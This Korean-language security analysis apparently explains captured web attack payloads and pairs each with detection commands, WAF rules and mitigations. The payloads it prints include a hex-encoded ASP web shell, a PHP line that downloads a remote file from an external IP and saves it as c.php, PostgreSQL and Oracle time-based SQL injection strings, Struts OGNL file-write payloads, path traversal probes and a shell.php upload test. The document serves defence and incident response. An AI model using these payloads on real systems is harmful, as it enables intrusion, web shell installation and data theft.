
## **🌼 예시 코드 1: 서버 측 코드(injection) / 원격 코드 실행(RCE)**

서버 사이드 스크립트(ASP/VBScript)를 주입해 그 스크립트 내부에서 `Eval(Request(...))` 형태로 사용자 제공 코드를 실행하게 함 <br> → **서버 측 스크립트 코드 실행(RCE / server-side code injection)**.
  <br> → 기술적으로는 *code injection / remote code execution*이며, 결과적으로 공격자가 스크립트에서 OS 쉘을 호출하도록 코드를 작성하면 **OS 명령 실행도 가능**(command execution으로 이어질 수 있음).

```
<% <!--"--> EXeCute(CON("4556614c2872655155455374282270417353313233222929")) ... End Function %>
------WebKitFormBoundary...--
| POST | https://victim.com/WeChat/UploadHandler.ashx
```

HTTP POST(멀티파트 폼바디) 안에 포함된 것으로 보이며, ASP/VBScript 스타일의 서버 사이드 태그 ` <% ... %>`와 `Execute()`/`Eval()` 호출, 그리고 16진수 문자열이 섞여 있습니다.
멀티파트 바운더리와 `.ashx` 엔드포인트(ASP.NET 핸들러)에 업로드/전송하려는 시도입니다.


<br> 

### 16진수 문자열 디코딩 

페이로드에 있는 hex:
`4556614c2872655155455374282270417353313233222929`

한 바이트씩 디코딩 하고 결합하면

```
EVaL(reQUEST("pAsS123"))
```

`CON(...)` 함수(아래에서 설명)는 hex를 문자열로 변환하여 `EVaL(reQUEST("pAsS123"))`라는 코드 문자열을 만들고, 그 결과를 `Execute(...)`로 실행한다.


<br> 


### 코드 흐름(토큰 단위 해석)

* `<% ... %>` : ASP/Classic ASP 서버 스크립트 블록. 서버가 이 내부를 해석·실행함.
* `<!--"-->` : 주석/우회용 텍스트(필터를 깨거나 패턴 매칭을 우회하려는 흔적).
* `EXeCute(...)` : VBScript `Execute` 함수(또는 `ExecuteGlobal`) — 문자열로 받은 코드를 **현재 ASP 스크립트 컨텍스트에서 실행**.
* `CON("...")` : 페이로드 안에 정의된(또는 페이로드가 포함한) 함수로 보이며, 내부에서 hex 문자열을 한 쌍씩 읽어 `Chr(&Hxx)`로 조합해 원본 문자열을 복원합니다(입력은 16진수 인코딩).

  * `CON`은 단순히 hex 디코더 역할: hex → `"EVaL(reQUEST("pAsS123"))"`.
* `EVaL(reQUEST("pAsS123"))` : `Eval(Request("pAsS123"))` 와 동등. `Request("pAsS123")`는 HTTP 파라미터(또는 폼데이터, 쿼리 등)에서 `pAsS123` 값을 읽음. `Eval()`은 이 값을 표현식/코드로 평가(실행)하려 시도.
* 전체적으로: 서버에 이 스크립트가 삽입되면 공격자는 `pAsS123` 파라미터에 임의의 VBScript/PHP·ASP 코드(형식에 맞는 코드)를 보내 서버에서 실행시킬 수 있습니다.


---

## **🌼 예시 코드 2: 서버 측 원격 코드/파일 업로드 시도**


공격자는 PHP의 `copy()`(또는 `file_get_contents`+`file_put_contents`)를 이용해 원격 호스트(`143.92.43.153:112`)의 `dd.txt`를 받아 `c.php`라는 이름으로 서버에 저장하려고 합니다.
만약 `dd.txt` 내용이 PHP 코드(예: 웹셸)라면 `c.php`를 통해 RCE(원격 코드 실행) 가능성이 생깁니다.

```php
<?php
$a = "copy";
$a("http://143.92.43.153:112/dd.txt", "c.php");
?>
```

* `<?php ... ?>` : PHP 코드 블록.
* `$a = "copy";` : 문자열 `"copy"`를 변수 `$a`에 할당. (직접 `copy()` 를 쓰지 않고 변수로 쓴 이유는 탐지 우회)
* `$a("http://.../dd.txt", "c.php");` : 변수 `$a`는 함수명으로 평가되어 `copy("http://.../dd.txt", "c.php")`가 실행됩니다.

  * `copy(source, dest)` : PHP 내장 함수. `source`가 URL이면 `allow_url_fopen`/관련 설정이 허용될 경우 원격 리소스를 가져와 `dest`로 저장.
  * 결과: 원격 `dd.txt` 내용이 서버에 `c.php`로 저장된다.

공격자의 의도: `dd.txt` 내부에 `<?php ...웹셸... ?>`가 들어있다면, 저장된 `c.php`를 통해 서버측에서 원격 명령을 실행(웹셸)할 수 있음.


### 공격 시나리오

* `c.php`가 웹 루트(또는 외부에서 접근 가능한 경로)에 쓰여지면, 공격자는 `https://victim.com/.../c.php`로 접근하여 웹셸을 사용하거나 추가 페이로드를 불러들임.
* `copy()`가 실행되려면:

  * 웹 애플리케이션이 **사용자 입력을 그대로 PHP로 실행(예: `eval`, `include` 또는 저장 후 실행)** 하거나,
  * 공격자가 파일 업로드/쓰기 권한이 있는 위치에 임의로 파일을 쓸 수 있어야 함.
* 탐지 우회를 위해 함수명을 변수에 담아 호출(`$a="copy"; $a(...)`) — 서명 기반 방어에 걸리기 어려움.


# 7. 흔한 성공 지표 (IOC)

* `c.php` 또는 유사 이름의 새 PHP 파일 발견, 내부에 `<?php`로 시작하는 코드(특히 `eval($_POST[...])`, `system`, `passthru`, `shell_exec`, `base64_decode` 등).
* 접근 로그에서 POST/GET으로 `c.php` 호출 흔적.
* 웹서버가 외부로 `HTTP GET` 요청을 보낸 기록(방화벽/IDS, 또는 `tcpdump`/웹 프록시 로그).
* 파일 타임스탬프가 공격 시점과 일치.

---

# 8. 근본적 완화(패치·설계 변경)

* **업로드 핸들러 수정**: 업로드된 데이터 절대로 PHP로 실행하거나 `.php` 확장자로 저장하지 않도록. 업로드한 파일은 가능한 외부 접근 불가 경로에 보관하고, 서빙 시 MIME 검증 후 안전한 변환(예: 이미지 리사이즈)만 허용.
* **함수 제한**: PHP 설정에서 `allow_url_fopen=Off` 또는 외부 URL을 통한 `copy()` 호출을 제한. 위험 함수들(`exec`, `system`, `shell_exec`, `popen`, `proc_open`, `eval`)을 `disable_functions`에 추가 고려(운영 영향 확인 필요).
* **권한 최소화**: 웹서버 계정이 웹 루트에 새로운 `.php` 파일을 생성하지 못하게 파일 시스템 권한 최소화.
* **WAF 규칙**: `copy("http://` 같은 패턴, 변수로 함수 호출하는 패턴(`$a="copy"; $a(...)`)을 탐지/차단하는 룰 추가.
* **무결성 모니터링**: AIDE/Tripwire 등으로 웹 루트 파일 변화를 실시간 알림.
* **패치**: 애플리케이션/프레임워크 최신 버전 적용, 알려진 취약점(업로드 핸들러·디렉토리 권한) 패치.

---

# 9. 간단한 WAF/IDS 시그니처 예시

(정규식 예시 — ModSecurity 룰로 변환 가능)

```
SecRule ARGS|REQUEST_BODY "@rx \$\w+\s*=\s*\"copy\"" "id:10001,deny,log,msg:'Possible obfuscated copy() remote file download attempt'"
SecRule REQUEST_BODY "@rx copy\s*\(\s*https?://[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+/.*\s*,\s*['\"]?[A-Za-z0-9_\-]+\.php['\"]?\s*\)" "id:10002,deny,log,msg:'Remote file download to .php detected'"
```

---

# 10. 추가 권장 검사

* 원격 호스트(`143.92.43.153:112`)로의 아웃바운드 트래픽/접속 여부(방화벽/IDS) 확인.
* `dd.txt`의 내용이 무엇인지(다운로드에 성공했다면) 확인 — 이는 공격자의 의도(웹셸, 백door, 바이너리 등)를 판별.
* 시스템 계정(특히 웹서버 계정)의 crontab, `.bash_history` 등에서 이상 행위 검색.
* 침해 사실 확인 시 법적·운영적 프로세스(고객 알림, 규정 보고 등) 진행.

---

# 11. 요약(핵심)

* 제공하신 PHP 코드는 **원격 파일을 가져와 로컬에 `c.php`로 저장하려는 시도**입니다. 이는 **웹셸 설치 시도**이며 **매우 위험**합니다.
* 기술적으로는 *command injection* (쉘 인젝션) 보다는 **서버 사이드 코드 인젝션 / 웹셸 업로드**로 분류됩니다.
* 즉시 로그·파일 검사, 공격자 IP 차단, 의심 파일 격리, 자격증명 변경, 패치·보안강화가 필요합니다.

---

# 예시 3 SQL Injection(시간 기반 블라인드 SQLi) 시도**가 맞습니다. 아래에 하나하나 풀어 설명하고, 탐지·대응·완화 방안까지 실전용으로 정리합니다. (안전상: 절대 이 페이로드를 실제 DB에 `eval`·`exec` 하지 마세요.)


# 1) 페이로드(디코딩)

요청 파라미터 원문:

```
?language\=en%20AND%208246%3D%28SELECT%208246%20FROM%20PG_SLEEP%285%29%29
```

URL 디코딩(사람이 읽기 쉬운 형태):

```
?language=en AND 8246=(SELECT 8246 FROM PG_SLEEP(5))
```

* `%20` = 스페이스, `%3D` = `=`, `%28` = `(`, `%29` = `)` 등.

---

# 2) 이게 무슨 공격인지(의도)

* 구조: `... AND 8246 = (SELECT 8246 FROM PG_SLEEP(5))`

  * `PG_SLEEP(5)` 은 **PostgreSQL**의 지연 함수(`pg_sleep(5)`의 대소문자 무관)로, 호출 시 해당 쿼리 세션을 5초 동안 정지시킵니다.
  * `SELECT 8246 FROM PG_SLEEP(5)` 는 `pg_sleep(5)`가 실행된 뒤 `8246`을 반환하도록 한 표현입니다.
  * 클라이언트가 이 조건을 참일 때(항상 참이므로) 서버가 쿼리를 처리하며 **지연이 발생**합니다.
* 의도: **시간 기반 블라인드 SQL 인젝션(time-based blind SQLi)** — 서버 응답 지연을 유발해 취약 여부를 판단하거나, 추후 데이터 추출(비트 단위) 시 응답 시간으로 비트값을 판별하는 데 사용.

결론: **명백한 SQLi** (특히 PostgreSQL을 노린 시간 지연형).

---

# 3) 왜 위험한가

* 데이터 유출 없이도 서비스 거부(DoS)나 탐지 회피 가능한 정보 수집이 가능.
* 반복적/정교한 시간 기반 쿼리로 DB의 민감정보(사용자, 테이블명, 컬럼값) 하나씩 추출 가능.
* `pg_sleep` 같은 함수는 권한 없이도 호출 가능한 경우가 많아, 거의 모든 Postgres 환경에서 유효할 가능성 높음.

---

# 4) 어떻게 탐지하나(로그·네트워크·응답)

* 짧은 시간에 같은 엔드포인트가 지연 응답(5초 단위 패턴) 보이면 의심.
* Access log에서 `%20AND%20` 또는 `pg_sleep` 등 문자열 검색.
* 예시 grep(서버에서):

```bash
# URL 인코딩 형태로 검색
grep -R -n "%20AND%20" /var/log/nginx/* /var/log/apache2/*

# 또는 디코딩 후 패턴 검색(단순)
grep -R -n -i "pg_sleep" /var/log/*

# 혹은 숫자 비교 패턴 탐색
grep -R -n -E "AND[[:space:]]+[0-9]+\s*=" /var/log/* 
```

* IDS/웹서버에서 응답시간(타임아웃) 기반 알람 설정 권장.

---

# 5) 즉시 대응(수동 조사 + 차단)

1. 해당 요청을 보낸 **IP 차단**(방화벽/WAF) — 로그 보존.
2. 공격이 의심되는 요청들의 **요청 바디/쿼리스트링**을 확보(포렌식).
3. 애플리케이션 코드에서 `language` 파라미터가 어떻게 DB 쿼리에 들어가는지 확인 — **직접 문자열 이어붙이기(concatenation)** 사용되는지 우선 점검.
4. DB 접속 수/동시성 모니터링(지연 공격으로 인한 연결 누수 여부 확인).
5. Postgres라면 `statement_timeout`(예: 2000ms) 설정으로 장시간 쿼리 차단 고려:

   ```sql
   -- 세션 단위 예시
   SET statement_timeout = 2000; -- 2초
   ```

   또는 postgresql.conf에서 전역 설정.

---

# 6) 근본적 완화(우선순위)

* **Prepared statements / Parameterized queries** 사용 — 쿼리와 데이터 분리.

  * PHP(PDO) 예:

    ```php
    $stmt = $pdo->prepare('SELECT * FROM table WHERE language = ?');
    $stmt->execute([$language]);
    ```
* **ORM/쿼리 빌더** 사용(정상적으로 파라미터 바인딩 지원).
* **입력 검증(화이트리스트)**: `language`처럼 허용값이 한정된 경우 가능한 값 목록(예: `['en','ko','ja']`)으로 검사.
* **DB 계정 권한 최소화**: 애플리케이션이 사용하는 DB 계정은 꼭 필요한 권한만 부여.
* **DB 설정**: `statement_timeout`, 연결 수 제한, 리소스 쿼터.
* **WAF 룰**: `AND` + `(SELECT ... SLEEP|pg_sleep|SLEEP)` 패턴 차단/경고.

---

# 7) 예시 WAF/ModSecurity 룰(간단)

```text
SecRule ARGS|REQUEST_URI|REQUEST_BODY "@rx (?i)\bAND\b.*\b(SELECT|UNION)\b.*\b(pg_sleep|sleep)\b" \
 "id:900100,phase:2,deny,log,msg:'Time-based SQLi attempt (pg_sleep/sleep) detected'"
```

---

# 8) 조사용 체크리스트(빠르게 돌려볼 것)

* 애플리케이션 코드에서 `language` 파라미터가 포함되는 모든 쿼리를 찾기:

```bash
grep -R --line-number -n "language" /var/www 2>/dev/null
```

* 최근 비정상적(느린) 응답 로그 확인:

```bash
# 5초 이상 응답 로그(예: nginx 로그에 $request_time 사용 시)
awk '$NF > 5 { print }' /var/log/nginx/access.log
```

* 의심 IP가 여러 번 시도했는지 타임라인 확인:

```bash
grep "AND 8246" /var/log/nginx/access.log* -n
```

---

# 9) 요약(한 문장)

`?language=en AND 8246=(SELECT 8246 FROM PG_SLEEP(5))` 는 **PostgreSQL 대상의 시간 기반 블라인드 SQL 인젝션 시도**로, 응답 지연을 이용해 취약성 유무를 확인하거나 비밀을 추출하려는 명백한 공격입니다 — 즉시 로그 조사, IP 차단, 준비문 사용 및 DB `statement_timeout` 등으로 차단하세요.

원하시면:

* 귀하의 웹로그(민감정보 마스킹한 부분)를 붙여주시면 — 해당 요청이 실제로 성공했는지(응답 지연·반복성·성공지표)를 바로 같이 분석해 드립니다.
* 또는 PHP/Java 등 사용중인 언어에 맞춘 **안전한 DB query 리팩터링 예제**(실무 코드)를 바로 제공해 드릴까요?


---


# 예시 4 **Oracle을 노린 SQL Injection(시간/블라인드·OOB 기법)** 페이로드입니다. 자세히 풀어드릴게요.


## 1) 원문(디코딩해서 보기)

주신 쿼리 스트링 일부(사람이 읽기 쉬운 형태):

```
language=en') AND 8678 = DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(82)||CHR(88)||CHR(88),5) AND ('MGbx'='MGbx
```

* `%27` = `'` (따옴표) 등 URL 디코딩 적용된 형태입니다.
* 공격자는 기존 쿼리 문맥을 깨고 `AND ...` 절을 삽입해 DB 로직을 제어하려 합니다.

---

## 2) 뭐하는 페이로드인가 (무슨 기법?)

* `DBMS_PIPE.RECEIVE_MESSAGE(name, timeout)` 은 Oracle의 패키지 함수로 **주어진 파이프 이름(name)** 에 대해 메시지를 기다립니다.
* 두 번째 인자 `5`는 타임아웃(초)입니다. 만약 해당 파이프에 메시지가 없으면 **최대 5초간 대기**합니다(=지연).
* `CHR(88)||CHR(82)||CHR(88)||CHR(88)` 은 문자 연결로 `'X' || 'R' || 'X' || 'X'` 같은 문자열(=파이프 이름)을 만듭니다.
* 따라서 `8678 = DBMS_PIPE.RECEIVE_MESSAGE(...,5)` 같은 조건은 DB가 `RECEIVE_MESSAGE` 호출로 **차단(지연)** 되게 하여 응답시간으로 참/거짓을 확인하는 **시간 기반 블라인드 SQLi** 또는 OOB(Out‑of‑band) 방식의 탐지/데이터 추출 기법입니다.

요약: **Oracle SQLi (시간 지연 / 블라인드 / OOB) 공격**입니다.

---

## 3) 왜 command injection이 아닌가

* **Command injection**: 애플리케이션이 외부 입력을 운영체제 쉘(예: `system()`, `exec()`, backticks 등)에 전달하여 OS 명령을 실행하게 만드는 취약점.
* 이 페이로드는 **데이터베이스 함수**(`DBMS_PIPE.RECEIVE_MESSAGE`)를 호출하게 만드는 SQL 구문 조작입니다. OS 쉘 명령을 직접 실행하려는 부분(`cat`, `xp_cmdshell` 등)은 전혀 포함되어 있지 않습니다.
* 결과적으로 취약성 분류는 **SQL Injection / RCE(데이터베이스 차원) 가능성**이지, 운영체제 쉘 명령 실행(=command injection)은 아닙니다.

---

## 4) 공격 위험성

* 시간 지연을 이용하면 데이터베이스의 민감한 정보를 **비트 단위로** 추출할 수 있으므로, 성공하면 **데이터 유출**이나 더 큰 침해로 이어질 수 있습니다.
* 또한 DB 계정이 높은 권한을 가지고 있으면 DB 내부의 PL/SQL 패키지를 통해 추가 악용(파일 읽기/쓰기, 네트워크 연결 등)이 가능할 수 있습니다.

---

## 5) 실무적 탐지·조사 방법 (즉시 실행 가능한 명령들)

* 로그에서 유사 패턴 검색:

```bash
# URL 인코딩/디코딩 섞인 경우를 위해 raw와 디코딩된 패턴 둘 다 검색
grep -R -n -i "DBMS_PIPE.RECEIVE_MESSAGE" /var/log/nginx /var/log/apache2 2>/dev/null
grep -R -n -i "DBMS_PIPE" /var/log/* 2>/dev/null
grep -R -n -E "CHR\([0-9]+\)\|\|" /var/www /var/log 2>/dev/null
```

* 응답 지연 패턴 확인 (특정 IP가 반복적으로 5초/10초씩 지연을 유발했는지):

```bash
# nginx 액세스로그에서 response time을 찍고 있다면(또는 $request_time 변수 사용)
awk '$NF > 4 {print}' /var/log/nginx/access.log
```

* 애플리케이션 소스에서 `language`(혹은 취약 파라미터)가 DB 쿼리에 어떻게 들어가는지 검색:

```bash
grep -R --line-number "language" /var/www 2>/dev/null
grep -R --line-number -E "\$_(GET|POST|REQUEST).*language" /var/www 2>/dev/null
```


---


### 1)

`https://CC.com/index/ajax/lang?lang\=..//..//application/database`
**의도 · 분류**: 디렉터리 트래버설 / LFI(로컬 파일 포함) 시도. `..//..//application/database` 형태로 상위 디렉터리로 올라가서 내부 파일(예: `application/database`)에 접근하려는 시도.
**위험도**: 중〜높음 (대상 파일이 소스/설정/암호 등 민감 정보를 포함하면 심각).
**탐지 포인트**: 접근 로그에서 `..` 또는 `%2e%2e` 같은 인코딩, 연속된 슬래시, `lang=` 파라미터 값에 비정상 경로.
**대응**: 입력값 정규화(화이트리스트), 경로 정규화 후 접근 허용, 파일시스템 권한 최소화, WAF 룰 추가.

---

### 2)

`SCANTL\=7,WEBATCK\=10,WEBATCK\=10,/seeyon/autoinstall.do/..;/ajax.do`
**의도 · 분류**: 경로 조작/트래버설 시도로 보이는 로그형 문자열(스캐너 또는 공격 툴 헤더 표기 포함). `seeyon`은 A6/Seeyon 그룹웨어 관련 URI로 알려져 있으며, 과거 취약점 공격 대상이었던 경우가 있음. `..;` 와 같은 구문은 트릭(세미콜론 포함 경로, 경로 재조합) 시도.
**위험도**: 중간 — 타깃 시스템의 특정 취약(Seeyon 관련 취약점 또는 서블릿 경로 처리 문제)이 존재하면 심각.
**탐지 포인트**: 접근 로그에서 `seeyon` 관련 비정상 경로, 세미콜론(`;`) 포함 경로, 반복적인 `SCANTL`/`WEBATCK` 같은 스캐너 마커.
**대응**: 관련 패치(Seeyon 포함 서드파티 SW), 접근제어, WAF 서명 추가.

---

### 3)

`SCANTL\=7,WEBATCK\=10,WEBATCK\=10,/seeyon/thirdpartyController.do/..;/ajax.do`
(위와 동일한 유형 — `seeyon` 대상의 트래버설/탐색 시도)
**의도/위험/대응**: 2)와 동일하게 보시면 됩니다.

---

### 4)

`index/ hinkModule/Action/Param/${@phpinfo()},{@phpinfo(`
**의도 · 분류**: 템플릿/표현식 삽입 또는 PHP 코드 인젝션 시도(템플릿 인젝션/서버 사이드 템플릿에서 PHP 함수 호출을 시도). `${...}` 형태는 템플릿 표현식(또는 일부 프레임워크에서 eval 가능한 표현식)으로 해석되어 `phpinfo()`를 실행하려는 목적.
**위험도**: 높음(실제로 코드가 실행되면 정보 누출 → RCE로 이어질 수 있음).
**탐지 포인트**: 요청 경로/파라미터에 `${`, `@phpinfo`, `phpinfo(` 같은 패턴, 응답에 PHP 환경 정보(phpinfo 출력) 포함 여부.
**대응**: 입력 이스케이프/템플릿 사용법 검토, 템플릿 엔진의 표현식 허용 범위 제한, 민감 정보 출력 차단.

---

### 5)

`index/ hinkmodule/action/param1/${@phpinfo()},{@phpinfo(`
(4)와 동일한 시도 — 파라미터명이 다름)
**의도/위험/대응**: 4)와 동일.

---

### 6)

`SCANTL\=7,WEBATCK\=10,WEBATCK\=10,/seeyon/genericController.do/..;/ajax.do`
(2,3과 동일 계열 — seeyon 관련 트래버설/스캐닝)
**의도/위험/대응**: 위와 동일.

---

### 7)

`php://filter`
**의도 · 분류**: PHP 스트림 래퍼를 이용한 소스 코드 노출 시도(php://filter/convert.base64-encode/resource=패스 등으로 LFI와 결합하면 소스코드 읽기).
**위험도**: 중〜높음(파일을 읽어 소스·설정·비밀번호를 노출할 수 있음).
**탐지 포인트**: 요청 파라미터/경로에 `php://` 또는 `php%3A%2F%2F` 같은 인코딩된 형태 등장. 응답에 base64 텍스트가 나타날 수 있음.
**대응**: 파일 포함에 쓰이는 입력값을 엄격히 제한, php 스트림 래퍼 사용 차단(필요시), 파일 권한 제한.

---

### 8)

긴 OGNL/Struts 스타일 페이로드들 (두 가지 변형 포함) — 예:

```
method:#_memberAccess\=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
#req\=@org.apache.struts2.ServletActionContext@getRequest(),
#res\=@org.apache.struts2.ServletActionContext@getResponse(),
#res.setCharacterEncoding(#parameters.encoding[0]),
#w\=#res.getWriter(),
#path\=#req.getRealPath(#parameters.pp[0]),
new java.,method:#_memberaccess\=@ognl.ognlcontext@default_member_access,...
newjava.io.bufferedwriter(newjava.io.filewriter(#path#parameters.filename[0]).append(#parameters.content[0])).close(),#w.print(#parameters.info1[0]),...
```

**의도 · 분류**: **Apache Struts(OGNL) 인젝션을 통한 원격명령/코드 실행(RCE)** 시도. `_memberAccess`를 우회하여 `ServletActionContext`를 통해 요청/응답/파일시스템에 접근, `java.io.FileWriter` 등을 사용해 서버에 파일을 쓰거나 임의 코드 실행을 시도하는 전형적 Struts OGNL 페이로드.
**위험도**: 매우 높음 — 역사적으로 치명적(원격 코드 실행) 취약점에서 동일 기법이 사용됨(예: Struts2 OGNL 취약점 사례).
**탐지 포인트**: 요청에 `#_memberAccess`, `ServletActionContext`, `ognl`, `getWriter()`, `getRealPath`, `java.io` 같은 문자열이 포함. 응답/서버에 새 파일(웹셸 등) 생성 여부, 에러로그(Java 예외) 확인.


---

# 예시 File upload / PHP code injection

**multipart/form-data 파일 업로드 요청의 전형적 형태**로, 목적은 `shell.php` 라는 PHP 파일을 서버에 업로드해 웹에서 실행(토큰 출력)되는지 확인하는 **웹셸 업로드 / PHP 코드 인젝션 시도**입니다. 아래에 구조·의도·성공 조건·탐지·대응을 한눈에 보기 좋게 정리합니다.


# 1) 원본(정리된 형태)

```http
<?php echo '33zVO2dZwGOAq7rZWY7nQom2DTd'; ?>
--WebKitFormBoundary33zVNxq4FnkZLQbsq1DkPmwAkDC
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php
```


# 2) 무엇을 의미하나 (구조 설명)

* `--WebKitFormBoundary...` 
  : multipart 바운더리(브라우저가 만든 구분자). 요청 바디에서 각 파트의 시작/끝을 구분.
* `Content-Disposition: form-data; name="file"; filename="shell.php"`
  : 업로드 필드 이름(file), 업로드될 파일명(shell.php)
* `Content-Type: application/x-php`
  : 업로드 파일의 MIME 타입(여기서는 PHP).
* 파일 본문 `<?php echo '33z...'; ?>`
  : 서버가 이 내용을 그대로 저장하고 .php로 실행하면, 브라우저에 토큰 문자열을 출력함(POC: 업로드/실행 성공 증거)
* 마지막 바운더리 `--...--` 는 multipart의 끝을 나타냄.
  
의도: 파일 업로드 핸들러를 통해 shell.php라는 PHP 파일을 서버에 쓰게 하고, 그 파일을 웹에서 호출해 PHP가 실행되는지(서버가 코드를 해석하는지)를 확인하려는 POC(증거 출력)입니다. 성공 시 추가 악성행위(명령 실행, 백도어 등)를 감행할 수 있습니다.


# 5) 성공하려면 필요한 조건

1. **엔드포인트가 multipart/form-data를 받고 파일을 처리(저장)해야 함.** (`admin-ajax.php` 자체는 기본 워드프레스 AJAX 핸들러이며, 플러그인이 업로드를 구현한 경우가 있어야 함.)
2. **업로드 핸들러가 파일명/확장자/내용 검증을 하지 않거나 우회 가능해야 함.** (예: 확장자 검사 우회, MIME 검사 미비)
3. **파일이 웹에서 접근 가능한 디렉터리(예: `/wp-content/uploads/` 등)에 `.php` 확장자로 저장되어 웹서버가 PHP를 실행할 수 있어야 함.**
4. **웹서버 파일권한/설정이 PHP 실행을 허용해야 함** (예: 업로드 폴더에서 PHP 실행이 차단되어 있지 않아야 함).
5. **저장된 파일을 액세스한 기록(또는 해당 토큰이 응답에 포함)** 이 있어야 실제 성공 판별 가능.

---

# 6) 탐지(증거 수집) — 안전한 방법(권장 명령)

(서버에서 루트/웹 루트 접근 가능한 상황 가정 — 안전·읽기 전용 명령들)

* 웹서버 접근 로그에서 해당 바운더리나 토큰 찾기:

```bash
# 액세스/에러 로그에서 토큰(응답에서 나올 수 있는 문자열) 검색
grep -R "33zVO2dZwGOAq7rZWY7nQom2DTd" /var/log/nginx* /var/log/apache2* || true

# POST 바디/바운더리 문자열 검색 (로그에 바디가 남는 경우에만 유효)
grep -R "WebKitFormBoundary33zVNxq4FnkZLQbsq1DkPmwAkDC" /var/log/nginx* /var/log/apache2* || true
```

* 업로드 디렉터리에서 최근 `.php` 파일 찾기:

```bash
# 워드프레스 업로드 폴더 예시
find /var/www/html/wp-content/uploads -type f -iname "*.php" -mtime -30 -ls
# 토큰 포함 여부 검사
grep -R "33zVO2dZwGOAq7rZWY7nQom2DTd" /var/www/html/wp-content/uploads || true
```

* 웹 루트 전체에서 토큰 포함 파일 검색:

```bash
grep -R --line-number "33zVO2dZwGOAq7rZWY7nQom2DTd" /var/www/html || true
```

* 접근 로그에서 파일에 대한 GET 요청(업로드 이후 실행 시도) 검색:

```bash
grep -R "GET .*shell.php" /var/log/nginx* /var/log/apache2* || true
# 또는 토큰이 포함된 응답을 확인한 IP 확인
```

> 주의: **직접 웹셸을 실행(HTTP GET으로 호출)을 재현하지 말 것.** 증거 수집은 읽기·검색으로만 수행하세요.

---


